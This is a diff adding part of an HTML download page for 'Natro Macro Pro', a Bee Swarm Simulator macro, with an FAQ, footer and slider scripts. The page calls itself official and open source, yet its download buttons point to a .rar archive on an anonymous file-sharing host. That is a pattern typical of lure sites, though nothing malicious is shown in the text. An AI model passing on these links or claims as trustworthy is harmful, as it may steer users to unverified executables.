+                        <p>Join our active Discord community at discord.gg/natromacro for instant support from thousands of users and the development team. You can also use our contact form for specific inquiries. The community shares troubleshooting guides, optimization tips, and custom patterns.</p>
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <button class="faq-question">
+                        Is Natro Macro Pro compatible with the latest game version?
+                        <span class="faq-icon">+</span>
+                    </button>
+                    <div class="faq-answer">
+                        <p>Yes, our development team maintains Natro Macro Pro with regular updates to ensure compatibility with the latest Bee Swarm Simulator updates. Always download the newest version from our official download page for the best experience and latest features.</p>
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <button class="faq-question">
+                        Where should I download Natro Macro Pro from?
+                        <span class="faq-icon">+</span>
+                    </button>
+                    <div class="faq-answer">
+                        <p>Only download from our official sources: this website's download page and our Discord server (discord.gg/natromacro). Never download from unofficial third-party sites as they may distribute modified or malicious versions. Your safety is our priority.</p>
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <button class="faq-question">
+                        What are the system requirements?
+                        <span class="faq-icon">+</span>
+                    </button>
+                    <div class="faq-answer">
+                        <p>Natro Macro Pro  runs on Windows 7/8/10/11. You need a PC capable of running Roblox smoothly. AutoHotkey is included in the download. The macro is lightweight and won't significantly impact your system performance during operation.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- CTA Section -->
+    <section class="bg-light">
+        <div class="container text-center">
+            <div class="section-header">
+                <h2>Start Automating Today</h2>
+                <p class="section-subtitle">Join thousands of players who have transformed their Bee Swarm Simulator experience</p>
+            </div>
+            <div class="cta-buttons" style="justify-content: center;">
+                <a href="https://anondrop.net/1567028999744393297/Natro.Macro.Pro.v1.2.1.rar?download=true&token=9492849a-d992-44fb-8831-3e0b5877277c" download="Natro.Macro.Pro.v1.2.1.rar" target="_blank" rel="noopener noreferrer" class="btn btn-primary" style="font-size: 1.125rem; padding: 1.25rem 2.5rem;">
+                    <span>⬇️</span> Download Natro Macro Pro 
+                </a>
+                <a href="https://discord.gg/natromacro" target="_blank" rel="noopener noreferrer" class="btn btn-discord" style="font-size: 1.125rem; padding: 1.25rem 2.5rem;">
+                    <span>💬</span> Join Discord
+                </a>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="footer-content">
+            <div class="footer-section">
+                <h3>Natro Macro Pro</h3>
+                <p>The most advanced free automation tool for Bee Swarm Simulator. Open-source, transparent, and trusted by thousands of players worldwide.</p>
+                <p style="margin-top: 1.5rem; font-size: 0.875rem; opacity: 0.7;">Powered by Natro Team</p>
+            </div>
+            <div class="footer-section">
+                <h3>Quick Links</h3>
+                <ul>
+                    <li><a href="index.html">Home</a></li>
+                    <li><a href="https://anondrop.net/1567028999744393297/Natro.Macro.Pro.v1.2.1.rar?download=true&token=9492849a-d992-44fb-8831-3e0b5877277c" download="Natro.Macro.Pro.v1.2.1.rar" target="_blank" rel="noopener noreferrer">Download</a></li>
+                    <li><a href="contact.html">Contact</a></li>
+                    <li><a href="https://discord.gg/natromacro" target="_blank" rel="noopener noreferrer">Discord</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Legal</h3>
+                <ul>
+                    <li><a href="privacy-policy.html">Privacy Policy</a></li>
+                    <li><a href="terms.html">Terms &amp; Conditions</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Community</h3>
+                <div class="social-links">
+                    <a href="https://discord.gg/natromacro" target="_blank" rel="noopener noreferrer" title="Discord">💬</a>
+                </div>
+                <p style="margin-top: 1rem;">Join our Discord for support, updates, custom patterns, and community discussions!</p>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>© 2025 Natro Macro Pro. Open Source under GNU GPL v3.0. All Rights Reserved.</p>
+        </div>
+    </footer>
+
+    <!-- JavaScript -->
+    <script>
+        // Mobile Menu Toggle
+        const menuToggle = document.getElementById('menuToggle');
+        const navLinks = document.getElementById('navLinks');
+
+        menuToggle.addEventListener('click', () => {
+            navLinks.classList.toggle('active');
+        });
+
+        navLinks.querySelectorAll('a').forEach(link => {
+            link.addEventListener('click', () => {
+                navLinks.classList.remove('active');
+            });
+        });
+
+        // Lightbox functionality
+        const lightbox = document.getElementById('lightbox');
+        const lightboxImg = document.getElementById('lightboxImg');
+        const images = [
+            'images/screenshot-1.png',
+            'images/screenshot-2.png',
+            'images/screenshot-3.png',
+            'images/screenshot-4.png',
+            'images/screenshot-5.png',
+            'images/screenshot-6.png',
+            'images/screenshot-7.png',
+            'images/screenshot-8.png'
+        ];
+
+        function openLightbox(index) {
+            lightboxImg.src = images[index];
+            lightbox.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeLightbox() {
+            lightbox.classList.remove('active');
+            document.body.style.overflow = 'auto';
+        }
+
+        // Close lightbox on escape key
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape' && lightbox.classList.contains('active')) {
+                closeLightbox();
+            }
+        });
+
+        // Screenshot Slider with Thumbnails
+        let currentScreenshotIndex = 0;
+        const screenshotSlides = document.querySelectorAll('.screenshot-slide');
+        const screenshotSlider = document.getElementById('screenshotSlider');
+        const thumbnailContainer = document.getElementById('thumbnailContainer');
+        const currentSlideDisplay = document.getElementById('currentSlide');
+        const totalSlidesDisplay = document.getElementById('totalSlides');
+
+        totalSlidesDisplay.textContent = screenshotSlides.length;
+
+        // Create thumbnails
+        screenshotSlides.forEach((slide, index) => {
+            const thumbnail = document.createElement('div');
+            thumbnail.className = 'thumbnail-item';
+            thumbnail.onclick = () => goToScreenshotSlide(index);
+
+            const img = document.createElement('img');
+            img.src = slide.querySelector('img').src;
+            img.alt = `Thumbnail ${index + 1}`;
+
+            thumbnail.appendChild(img);
+            thumbnailContainer.appendChild(thumbnail);
+        });
+
+        const thumbnails = document.querySelectorAll('.thumbnail-item');
+
+        function updateScreenshotSlider() {
+            screenshotSlider.style.transform = `translateX(-${currentScreenshotIndex * 100}%)`;
+            currentSlideDisplay.textContent = currentScreenshotIndex + 1;
+
+            thumbnails.forEach((thumb, index) => {
+                thumb.classList.toggle('active', index === currentScreenshotIndex);
+            });
+        }
+
+        function moveScreenshotSlide(direction) {
+            currentScreenshotIndex = (currentScreenshotIndex + direction + screenshotSlides.length) % screenshotSlides.length;
+            updateScreenshotSlider();
+        }
+
+        function goToScreenshotSlide(index) {
+            currentScreenshotIndex = index;
+            updateScreenshotSlider();
+        }
+
+        // Auto-advance slider
+        setInterval(() => moveScreenshotSlide(1), 5000);
+
+        updateScreenshotSlider();
+
+        // FAQ Accordion
+        const faqQuestions = document.querySelectorAll('.faq-question');
+
+        faqQuestions.forEach(question => {
+            question.addEventListener('click', () => {
+                const isActive = question.classList.contains('active');
+
+                // Close all FAQs
+                faqQuestions.forEach(q => {
+                    q.classList.remove('active');
+                    q.nextElementSibling.classList.remove('active');
+                });
+
+                // Open clicked FAQ if it wasn't active
+                if (!isActive) {
+                    question.classList.add('active');
+                    question.nextElementSibling.classList.add('active');
+                }
+            });
+        });
+
+        // Smooth scrolling
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                const href = this.getAttribute('href');
+                if (href !== '#' && document.querySelector(href)) {
+                    e.preventDefault();
+                    document.querySelector(href).scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+            });
+        });
+    </script>
+</body>
+</html>
